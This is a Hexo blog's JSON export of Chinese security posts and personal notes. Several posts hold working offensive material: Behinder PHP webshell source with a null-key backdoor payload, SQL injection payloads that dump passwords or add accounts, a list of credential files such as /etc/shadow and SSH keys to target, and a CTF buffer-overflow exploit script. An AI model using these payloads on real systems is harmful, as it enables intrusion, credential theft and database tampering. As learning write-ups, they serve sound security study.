{"meta":{"title":"Now you see me!","subtitle":"夫君子之行，静以修身，俭以养德。非淡泊无以明志，非宁静无以致远。","description":"","author":"Kerberos","url":"http://leemeanvvi.github.io","root":"/"},"pages":[{"title":"about","date":"2019-12-10T03:50:09.000Z","updated":"2020-06-10T15:36:40.067Z","comments":true,"path":"about/index.html","permalink":"http://leemeanvvi.github.io/about/index.html","excerpt":"","text":""},{"title":"categories","date":"2019-12-09T06:24:22.000Z","updated":"2020-06-10T15:36:40.068Z","comments":false,"path":"categories/index.html","permalink":"http://leemeanvvi.github.io/categories/index.html","excerpt":"","text":""},{"title":"tags","date":"2019-12-09T06:21:09.000Z","updated":"2020-06-10T15:36:40.067Z","comments":false,"path":"tags/index.html","permalink":"http://leemeanvvi.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"冰蝎php后门分析","slug":"冰蝎php后门分析","date":"2020-06-09T15:07:02.000Z","updated":"2020-06-10T15:36:40.064Z","comments":true,"path":"2020/06/09/冰蝎php后门分析/","link":"","permalink":"http://leemeanvvi.github.io/2020/06/09/%E5%86%B0%E8%9D%8Ephp%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/","excerpt":"前段时间在群里收到冰蝎php马有后门的消息，跟着调试了一下。","text":"前段时间在群里收到冰蝎php马有后门的消息，跟着调试了一下。 冰蝎php马平平无奇的冰蝎php马 123456789101112131415161718192021222324252627282930313233&lt;?php@error_reporting(0);session_start();if (isset($_GET[&#39;pass&#39;]))&#123; $key&#x3D;substr(md5(uniqid(rand())),16); $_SESSION[&#39;k&#39;]&#x3D;$key; print $key;&#125;else&#123; $key&#x3D;$_SESSION[&#39;k&#39;]; $post&#x3D;file_get_contents(&quot;php:&#x2F;&#x2F;input&quot;); if(!extension_loaded(&#39;openssl&#39;)) &#123; $t&#x3D;&quot;base64_&quot;.&quot;decode&quot;; $post&#x3D;$t($post.&quot;&quot;); for($i&#x3D;0;$i&lt;strlen($post);$i++) &#123; $post[$i] &#x3D; $post[$i]^$key[$i+1&amp;15]; &#125; &#125; else &#123; $post&#x3D;openssl_decrypt($post, &quot;AES128&quot;, $key); &#125; $arr&#x3D;explode(&#39;|&#39;,$post); $func&#x3D;$arr[0]; $params&#x3D;$arr[1]; class C&#123;public function __construct($p) &#123;eval($p.&quot;&quot;);&#125;&#125; @new C($params);&#125;?&gt; 正常连接的时候，客户端会先以GET方式发送pass=随机数给服务端，服务端将随机生成一串16位的字符串，将其作为key，存在session里面，并将key返回给客户端。后续客户端与服务端的通讯便以这串key作为加密解密的密钥。 而当我们跳过生成密钥这一步，直接与服务端通讯，就会发现后门的后门。 后门分析先看上半部分代码 123456789101112131415161718192021&lt;?php@error_reporting(0);session_start();if (isset($_GET['pass'])) &#123; $key = substr(md5(uniqid(rand())), 16); $_SESSION['k'] = $key; print $key;&#125; else &#123; //跳过了上面生成key的过程 $key = $_SESSION['k']; //因为跳过了上面生成$_SESSION['k']的过程，所以$key=null $post = file_get_contents(\"php://input\"); //从输入中获取$post if (!extension_loaded('openssl')) &#123; //检测是否载入了openssl模块 $t = \"base64_\" . \"decode\"; $post = $t($post . \"\"); for ($i = 0; $i &lt; strlen($post); $i++) &#123; $post[$i] = $post[$i] ^ $key[$i + 1 &amp; 15]; &#125; &#125; else &#123; $post = openssl_decrypt($post, \"AES128\", $key); //以null为密钥对$post进行AES128解密，生成新的$post &#125; 所以我们只要以null为密钥对参数进行AES128加密，就可以控制$post的值。下面代码输出了123456经过加密后的值 1234&lt;?php$plain &#x3D; &quot;123456&quot;;$cipher &#x3D; openssl_encrypt($plain,&quot;aes128&quot;, null);echo $cipher; encrypt 将这串加密后的值直接POST给冰蝎php马 cipher 经过解密后，$post的值确实解密回原来的123456，从而确认了$post可控。 decrypt 再来看下半部分代码 12345678910111213$arr &#x3D; explode(&#39;|&#39;, $post); &#x2F;&#x2F;以&#39;|&#39;为分割线，将$post分割为数组$func &#x3D; $arr[0];$params &#x3D; $arr[1];class C&#123; public function __construct($p) &#123; eval($p . &quot;&quot;); &#125;&#125;@new C($params); &#x2F;&#x2F;将C类实例化，传入$params，并通过魔术方法最后执行eval($params) 看到这里就明白了，如果我们控制$post=&quot;|phpinfo();&quot;，$arr将得到$arr[0]=&quot;&quot;，$arr[1]=&quot;phpinfo();&quot;的数组，从而使$params=&quot;phpinfo();&quot;最后实例化时将执行eval(&quot;phpinfo();&quot;) t71ph6.png 利用上面的代码生成|phpinfo();加密后的值4eNW1rQ1TnE2zNJbafdykw==，将其直接POST给冰蝎php马，即可看到phpinfo页面 t71GHs.png","categories":[{"name":"web安全","slug":"web安全","permalink":"http://leemeanvvi.github.io/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"Webshell","slug":"Webshell","permalink":"http://leemeanvvi.github.io/tags/Webshell/"}]},{"title":"sql注入-堆叠注入","slug":"sql注入-堆叠注入","date":"2020-01-05T07:51:15.000Z","updated":"2020-06-10T15:36:40.063Z","comments":true,"path":"2020/01/05/sql注入-堆叠注入/","link":"","permalink":"http://leemeanvvi.github.io/2020/01/05/sql%E6%B3%A8%E5%85%A5-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/","excerpt":"之前在强网杯中遇到堆叠注入，感觉打开了新世界的大门，然而一直没去研究，最近刚好想起来，虽然实战中还没碰到过，但是学习一下嘛，说不定哪天就用上了。","text":"之前在强网杯中遇到堆叠注入，感觉打开了新世界的大门，然而一直没去研究，最近刚好想起来，虽然实战中还没碰到过，但是学习一下嘛，说不定哪天就用上了。 堆叠注入是什么在写sql语句时，要用分号作为语句结束的标志。一般情况下，一次性只提交一个sql语句，如show databases;，结果如下 但如果在分号后再构造一个sql语句，那么这一次查询就会执行两个sql语句，如show databases;select user();，结果如下 而堆叠注入就是在传输参数的时候允许传入分号，并且允许执行以分号相隔的多条sql语句。最简单的用法就是select 1;show tables; 爆出当前库的表名。常见的注入要受原本的sql语句的限制，select就只能select，update就只能update，进行相应的增删改查。但是由于堆叠注入是在原本的sql语句结束后再构造新的sql语句，不受前面的sql语句的限制，威胁更大，不过局限也大。 堆叠注入的用法 使用预处理语句执行sql语句 set @sql = concat(“select * from xxx”); #存储sql语句prepare sqla from @sql; #预定义sql语句execute sqla; #执行sql语句 例如构造payload为1;set @sql = concat(&quot;select user,passwd from user&quot;);prepare sqla from @sql;execute sqla;#就可以在执行完原本的sql语句后再执行查询用户名和密码的sql语句。 使用预处理语句绕过关键词过滤 可以使用char函数配合绕过，如select被过滤的时候，select的ascii码分别为115,101,108,101,99,116，就可以用char(115,101,108,101,99,116)表示select，上述的payload就改为1;set @sql = concat(char(115,101,108,101,99,116),&quot; user,passwd from user&quot;);prepare sqla from @sql;execute sqla;# 直接修改数据库 比如select 1;insert into users(id,username,password) values(88,&#39;test&#39;,&#39;test&#39;)#往后台用户表中添加自己的账号","categories":[{"name":"web安全","slug":"web安全","permalink":"http://leemeanvvi.github.io/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"sql注入","slug":"sql注入","permalink":"http://leemeanvvi.github.io/tags/sql%E6%B3%A8%E5%85%A5/"}]},{"title":"任意文件读取读什么","slug":"任意文件读取读什么","date":"2020-01-05T06:32:28.000Z","updated":"2020-06-10T15:36:40.061Z","comments":true,"path":"2020/01/05/任意文件读取读什么/","link":"","permalink":"http://leemeanvvi.github.io/2020/01/05/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E8%AF%BB%E4%BB%80%E4%B9%88/","excerpt":"任意文件读取和任意文件下载还算是常见的漏洞，并且很多时候都可以在上面找到突破口。在此做一个汇总。","text":"任意文件读取和任意文件下载还算是常见的漏洞，并且很多时候都可以在上面找到突破口。在此做一个汇总。 linux /etc/passwd/etc/shadow/root/.bash_history/root/.ssh/id_rsa #ssh私钥/var/lib/mlocate/mlocate.db #低版本linux，存放各文件路径的文件 各种框架dedecms /webroot/data/common.inc.php #数据库配置文件/webroot/data/config.cache.inc.php #含邮件账号 thinkphp /webroot/config/database.php #数据库配置文件 empirecms /webroot/e/config/config.php #数据库配置文件 后续遇到后再补充。。","categories":[{"name":"web安全","slug":"web安全","permalink":"http://leemeanvvi.github.io/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"漏洞利用","slug":"漏洞利用","permalink":"http://leemeanvvi.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"}]},{"title":"2019 what have i done","slug":"2019-what-have-i-done","date":"2020-01-05T05:25:49.000Z","updated":"2020-06-10T15:36:40.064Z","comments":true,"path":"2020/01/05/2019-what-have-i-done/","link":"","permalink":"http://leemeanvvi.github.io/2020/01/05/2019-what-have-i-done/","excerpt":"2020年都过了几天了，还是给自己的2019年做个总结吧。","text":"2020年都过了几天了，还是给自己的2019年做个总结吧。 1月-5月这段时间非常痛苦，在不想丢掉实习这份收入的情况下，一边实习一边做毕业设计，然后写毕业论文，准备答辩。白天在上班，下班回来没怎么歇息就要着手弄自己拙劣的毕设，赶在ddl前把代码写好，太仓促了，总是在问自己之前的时间用来干嘛了。也还行吧，选题是《基于朴素贝叶斯定理的linux后门检测》（成品比较垃圾，都不好意思放上github，希望自己可以找机会完善）。借这个机会，了解了linux上的常用后门的原理以及检测方法，也在后续的工作中派上用场了，然后就是稍微接触到一些机器学习方面的知识，不至于一无所知（不过也仅限于此了。。）。然后实习上就是挖挖漏洞，写写报告，做做安服，有空就找些漏洞复现一下。 6月5月末的时候，觉得毕业之后还是得找一间大型一点的公司，在小公司比较局限。然后投了bytedance，一面就挂了，知识积累还是8太行，代码能力也很菜。最后去到了integritytech，6月的情况大家懂的。在这期间被派去驻场防守了，本职毕竟是渗透，对攻击payload比较敏感，给客户发现了问题还说得有模有样，带我去排查他们服务器，之前毕设的内容就派上用场了，然后也发现了问题。总之就是得到了客户的认可，感觉自己是有价值的。这期间就相当于在实战应急方面的东西，后门排查，日志分析，攻击溯源，然后在攻防方面也有了一些体会吧。虽然比较苦，9 9 6已经很要命了，而因为某些原因，那段时间可是8 10 7，但是我觉得还是ok的，毕竟我也不是奔着舒适的工作去的，不然我为什么要做乙方呢。 7月-12月6月底领到毕业证，从此已是社会人。回到公司之后就投入到实战当中了。以前getshell后都不敢乱动，现在拿库，维权，内网一条龙，这是在yxzc中最大的收获，感谢d0uchebag，我大哥，说是我安全生涯的领路人也不为过。12月底，想到更高的平台中发展，就投了chaitin。面试的时候感觉是将这一年的收获复述了一遍，看来这一年还是没有白费的。 期待2020，in Chaitin。","categories":[{"name":"whispers","slug":"whispers","permalink":"http://leemeanvvi.github.io/categories/whispers/"}],"tags":[]},{"title":"notes","slug":"notes","date":"2019-12-20T03:41:27.000Z","updated":"2020-06-10T15:36:40.066Z","comments":true,"path":"2019/12/20/notes/","link":"","permalink":"http://leemeanvvi.github.io/2019/12/20/notes/","excerpt":"","text":"deadbeef的作用调用栈 +-----------------+ | retaddr | +-----------------+ | saved ebp | ebp---&gt;+-----------------+ | parameter | | | | | | | | | | | +-----------------+ 构造payload +-----------------+ | system_addr | +-----------------+ | deadbeef | ebp---&gt;+-----------------+ | /bin/sh_addr | | | | | | | | | | | +-----------------+payload = “A”*n + p32(system) + p32(0xdeadbeef) + p32(str_bin_sh) deadbeeef的作用就是覆盖saved ebp 64位ROP需要栈对齐，详情后续再补充 32为ROP栈中参数利用完之后，就要将参数从栈中pop掉","categories":[{"name":"binary security","slug":"binary-security","permalink":"http://leemeanvvi.github.io/categories/binary-security/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://leemeanvvi.github.io/tags/pwn/"}]},{"title":"使用supervisor守护frp","slug":"使用supervisor守护frp","date":"2019-12-14T14:44:10.000Z","updated":"2020-06-10T15:36:40.065Z","comments":true,"path":"2019/12/14/使用supervisor守护frp/","link":"","permalink":"http://leemeanvvi.github.io/2019/12/14/%E4%BD%BF%E7%94%A8supervisor%E5%AE%88%E6%8A%A4frp/","excerpt":"渗透的时候或者平常需要用到内网映射的时候常常会用到frp，但是frp有时会断。以前为了解决这个问题还特意写了个脚本来检查frp进程，现在想起来实在是too young。最近刚好接触到守护进程，就拿frp来试试水，然后supervisor是一款常用的守护进程工具，就决定是你了。","text":"渗透的时候或者平常需要用到内网映射的时候常常会用到frp，但是frp有时会断。以前为了解决这个问题还特意写了个脚本来检查frp进程，现在想起来实在是too young。最近刚好接触到守护进程，就拿frp来试试水，然后supervisor是一款常用的守护进程工具，就决定是你了。 安装我使用的是ubuntu，用apt安装即可 apt-get install supervisor 配置文件supervisor的配置文件是/etc/supervisor/supervisord.conf 12345678910111213141516171819202122232425262728; supervisor config file[unix_http_server]file&#x3D;&#x2F;var&#x2F;run&#x2F;supervisor.sock ; (the path to the socket file)chmod&#x3D;0700 ; sockef file mode (default 0700)[supervisord]logfile&#x3D;&#x2F;var&#x2F;log&#x2F;supervisor&#x2F;supervisord.log ; (main log file;default $CWD&#x2F;supervisord.log)pidfile&#x3D;&#x2F;var&#x2F;run&#x2F;supervisord.pid ; (supervisord pidfile;default supervisord.pid)childlogdir&#x3D;&#x2F;var&#x2F;log&#x2F;supervisor ; (&#39;AUTO&#39; child log dir, default $TEMP); the below section must remain in the config file for RPC; (supervisorctl&#x2F;web interface) to work, additional interfaces may be; added by defining them in separate rpcinterface: sections[rpcinterface:supervisor]supervisor.rpcinterface_factory &#x3D; supervisor.rpcinterface:make_main_rpcinterface[supervisorctl]serverurl&#x3D;unix:&#x2F;&#x2F;&#x2F;var&#x2F;run&#x2F;supervisor.sock ; use a unix:&#x2F;&#x2F; URL for a unix socket; The [include] section can just contain the &quot;files&quot; setting. This; setting can list multiple files (separated by whitespace or; newlines). It can also contain wildcards. The filenames are; interpreted as relative to this file. Included files *cannot*; include files themselves.[include]files &#x3D; &#x2F;etc&#x2F;supervisor&#x2F;conf.d&#x2F;*.conf 可以看到include了/etc/supervisor/conf.d/目录下面的conf文件。我们要守护的进程配置文件就要添加在该目录。这里我们新建一个frp.conf文件，添加内容如下 12345678[program:frp]directory&#x3D;&#x2F;root&#x2F;software&#x2F;frp&#x2F;command&#x3D;&#x2F;root&#x2F;software&#x2F;frp&#x2F;frps -c &#x2F;root&#x2F;software&#x2F;frp&#x2F;frps.iniautostart&#x3D;trueautorestart&#x3D;truestartretries&#x3D;10redirect_stderr&#x3D;truestdout_logfile&#x3D;&#x2F;tmp&#x2F;rdp.log program参数为待会启动的时候的项目名 directory参数为要运行的脚本或程序所在的项目 command参数为要运行该脚本或程序时执行的命令 其他参数顾名思义就好了，具体意义网上也能找到更详细的解答 启动使用supervisorctl start frp命令（根据program名字）即可用supervisor启动frp进程 在启动的时候遇到了一个坑，在保存了配置文件后，输入上述命令显示 frp: ERROR (no such process) 然后查看status，重启supervisor服务之后都不行，一度怀疑人生，最后在大佬的帮助下才知道还要执行supervisorctl reload才会载入上述所写的配置文件，淦。","categories":[{"name":"misc","slug":"misc","permalink":"http://leemeanvvi.github.io/categories/misc/"}],"tags":[{"name":"linux","slug":"linux","permalink":"http://leemeanvvi.github.io/tags/linux/"}]},{"title":"rip_wp","slug":"rip-wp","date":"2019-12-12T15:37:40.000Z","updated":"2020-06-10T15:36:40.063Z","comments":true,"path":"2019/12/12/rip-wp/","link":"","permalink":"http://leemeanvvi.github.io/2019/12/12/rip-wp/","excerpt":"从buuctf中简单的题目开始学习pwn吧","text":"从buuctf中简单的题目开始学习pwn吧 查看文件信息使用checksec查看题目中的pwn1文件 123456Arch: amd64-64-littleRELRO: Partial RELROStack: No canary foundNX: NX disabledPIE: No PIE (0x400000)RWX: Has RWX segments 64位文件，没有开启栈保护，栈上数据可执行，没有开启ASLR ida查看文件代码发现程序中内置了后门函数fun() 1234int fun()&#123; return system(&quot;&#x2F;bin&#x2F;sh&quot;);&#125; 并且看到main函数中使用gets函数直接读取数据 12345678910int __cdecl main(int argc, const char **argv, const char **envp)&#123; char s; &#x2F;&#x2F; [rsp+1h] [rbp-Fh] puts(&quot;please input&quot;); gets(&amp;s, argv); puts(&amp;s); puts(&quot;ok,bye!!!&quot;); return 0;&#125; 那么思路就是在gets读取数据时，覆盖掉栈帧中的返回地址，控制程序ret到fun函数中执行system(“/bin/sh”)的地方，就可以getshell了 栈帧分析当gets读取数据时，将从栈中rbp-fh的地方也就是下表的buf_address开始写，我们的目标是要将返回地址ret_address覆盖成我们想要的地址，从buf_address到rbp的大小为0xf，rbp到ret_address的大小为0x8，所以从buf_address到ret_address的大小为0xf+0x8=0x17，也就是说要在栈中先写入0x17的字符，接着写入我们想控制程序返回的地址了 +-------------------------+ |buf_address | rbp-fh | |------------|------------| | ... | ... | | ... | ... | |------------|------------| | rbp | rbp | |------------|------------| |ret_address | rbp+8h | +-------------------------+ 编写exp在gdb中看到fun函数的地址0x401186 12gdb-peda$ p fun$1 &#x3D; &#123;&lt;text variable, no debug info&gt;&#125; 0x401186 &lt;fun&gt; fun函数的汇编如下 12345678910gdb-peda$ disassemble funDump of assembler code for function fun: 0x0000000000401186 &lt;+0&gt;: push rbp 0x0000000000401187 &lt;+1&gt;: mov rbp,rsp 0x000000000040118a &lt;+4&gt;: lea rdi,[rip+0xe8a] # 0x40201b 0x0000000000401191 &lt;+11&gt;: call 0x401040 &lt;system@plt&gt; 0x0000000000401196 &lt;+16&gt;: nop 0x0000000000401197 &lt;+17&gt;: pop rbp 0x0000000000401198 &lt;+18&gt;: ret End of assembler dump. 关键代码为0x40118a处，将”/bin/sh”字符串传给rdi，然后在0x401191中调用system函数执行，所以我们ret到0x40118a即可，最后exp如下 123456789from pwn import *context.log_level&#x3D;&#39;debug&#39;conn &#x3D; remote(&quot;node3.buuoj.cn&quot;,27674)shell &#x3D; 0x40118apayload &#x3D; &quot;A&quot;*0x17 + p64(shell)conn.sendline(payload)#conn.recvall()conn.interactive()","categories":[{"name":"binary security","slug":"binary-security","permalink":"http://leemeanvvi.github.io/categories/binary-security/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://leemeanvvi.github.io/tags/pwn/"},{"name":"buuctf","slug":"buuctf","permalink":"http://leemeanvvi.github.io/tags/buuctf/"}]},{"title":"gcc与pwn练习","slug":"gcc与pwn练习","date":"2019-12-11T16:41:22.000Z","updated":"2020-06-10T15:36:40.061Z","comments":true,"path":"2019/12/12/gcc与pwn练习/","link":"","permalink":"http://leemeanvvi.github.io/2019/12/12/gcc%E4%B8%8Epwn%E7%BB%83%E4%B9%A0/","excerpt":"","text":"普通用法gcc test.c -o test.o 开启/关闭栈可执行NX-z execstack / -z noexecstack 关闭/开启/全开启栈保护Canary-fno-stack-protector / -fstack-protector / -fstack-protector-all 关闭/开启地址随机化PIE-no-pie / -pie 关闭/部分开启/完全开启对GOT表写权限-z norelro / -z lazy / -z now","categories":[{"name":"binary security","slug":"binary-security","permalink":"http://leemeanvvi.github.io/categories/binary-security/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://leemeanvvi.github.io/tags/pwn/"}]},{"title":"sql注入-报错注入","slug":"sql注入-报错注入","date":"2019-12-10T09:07:03.000Z","updated":"2020-06-10T15:36:40.062Z","comments":true,"path":"2019/12/10/sql注入-报错注入/","link":"","permalink":"http://leemeanvvi.github.io/2019/12/10/sql%E6%B3%A8%E5%85%A5-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/","excerpt":"当站点中存在注入并且可以返回错误信息时，可以利用报错函数进行注入，省去确认字段数量的麻烦","text":"当站点中存在注入并且可以返回错误信息时，可以利用报错函数进行注入，省去确认字段数量的麻烦 mysql网上常见有十二种报错方法，然而实战中我最常用的只有updatexml()，函数名好记并且构造比较简单，对于其他报错函数非常陌生，遂逐一测试，以下为常见的报错方法在mysql 5.7.28版本下的测试结果 version upadtexml() select updatexml(1,concat(0x7e,user()),1); updatexml() extractvalue() select extractvalue(1,concat(0x7e,user())); extractvalue() floor() select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a; floor() name_const() select name_const(user(),0); 高版本不可用 join select * from(select * from mysql.user a join mysql.user b)c; 能用但貌似只能爆列名，用处不大 exp() select exp(~(select * from(select user())a)); 高版本不可用 GeometryCollection() geometrycollection((select * from(select * from(select user())a)b)); 高版本不可用 polygon() select polygon((select * from(select * from(select user())a)b)); 高版本不可用 multipoint() select multipoint((select * from(select * from(select user())a)b)); 高版本不可用 multlinestring() select multilinestring((select * from(select * from(select user())a)b)); 高版本不可用 multipolygon() select multipolygon((select * from(select * from(select user())a)b)); 高版本不可用 linestring() select linestring((select * from(select * from(select user())a)b)); 高版本不可用 小结updatexml()和extractvalue()函数是比较实用的，floor()函数的构造实在太难记了，后面几种报错方法看payload应该原理差不多，只是用不同函数来触发而已，而且高版本的mysql都用不了。","categories":[{"name":"web安全","slug":"web安全","permalink":"http://leemeanvvi.github.io/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"sql注入","slug":"sql注入","permalink":"http://leemeanvvi.github.io/tags/sql%E6%B3%A8%E5%85%A5/"}]},{"title":"sql注入base","slug":"sql注入base","date":"2019-12-10T08:39:21.000Z","updated":"2020-06-10T15:36:40.066Z","comments":true,"path":"2019/12/10/sql注入base/","link":"","permalink":"http://leemeanvvi.github.io/2019/12/10/sql%E6%B3%A8%E5%85%A5base/","excerpt":"第一篇正式的博客就从我入门安全的sql注入开始吧","text":"第一篇正式的博客就从我入门安全的sql注入开始吧 平平无奇的注入（mysql）sql注入也是老生常谈了，就从最基础的开始吧 判断是否存在注入以及确认是字符型还是数字型 加单引号，加减法，and 1=1，and 1=2 判断字段数量 order by n union select 1,2,3...n (n为字段数量，若与原查询语句不匹配，则sql语句将会报错) 爆当前数据库名（查询字段数量要与原查询语句匹配） union select database() 爆当前用户名 union select user() 爆当前数据库版本 union select version() 爆当前数据库表名 union select table_name from information_schema.tables where table_schema=database() 爆当前数据库的列名 union select column_name from information_schema.columns where table_schema=database() and tables_name=&#39;xxx&#39; dump数据 union select xxx from yyy 学习资源sqli-libs","categories":[{"name":"web安全","slug":"web安全","permalink":"http://leemeanvvi.github.io/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"sql注入","slug":"sql注入","permalink":"http://leemeanvvi.github.io/tags/sql%E6%B3%A8%E5%85%A5/"}]},{"title":"beginning","slug":"beginning","date":"2019-12-09T15:46:01.000Z","updated":"2020-06-10T15:36:40.064Z","comments":true,"path":"2019/12/09/beginning/","link":"","permalink":"http://leemeanvvi.github.io/2019/12/09/beginning/","excerpt":"","text":"其实想写博客很久了，在DO的vps上搭过wordpress，写了几篇没人看的文章之后不了了之。2019年12月10日00:09，毕业已经半年了，开始感受到现实带来的压力。生起了写博客的欲望，想要对自己的一些琐事做下记录。终于配置好hexo了，怀揣着些许忐忑和对未来的希冀，明天开始，好好努力吧！","categories":[{"name":"whispers","slug":"whispers","permalink":"http://leemeanvvi.github.io/categories/whispers/"}],"tags":[]}],"categories":[{"name":"web安全","slug":"web安全","permalink":"http://leemeanvvi.github.io/categories/web%E5%AE%89%E5%85%A8/"},{"name":"whispers","slug":"whispers","permalink":"http://leemeanvvi.github.io/categories/whispers/"},{"name":"binary security","slug":"binary-security","permalink":"http://leemeanvvi.github.io/categories/binary-security/"},{"name":"misc","slug":"misc","permalink":"http://leemeanvvi.github.io/categories/misc/"}],"tags":[{"name":"Webshell","slug":"Webshell","permalink":"http://leemeanvvi.github.io/tags/Webshell/"},{"name":"sql注入","slug":"sql注入","permalink":"http://leemeanvvi.github.io/tags/sql%E6%B3%A8%E5%85%A5/"},{"name":"漏洞利用","slug":"漏洞利用","permalink":"http://leemeanvvi.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"},{"name":"pwn","slug":"pwn","permalink":"http://leemeanvvi.github.io/tags/pwn/"},{"name":"linux","slug":"linux","permalink":"http://leemeanvvi.github.io/tags/linux/"},{"name":"buuctf","slug":"buuctf","permalink":"http://leemeanvvi.github.io/tags/buuctf/"}]}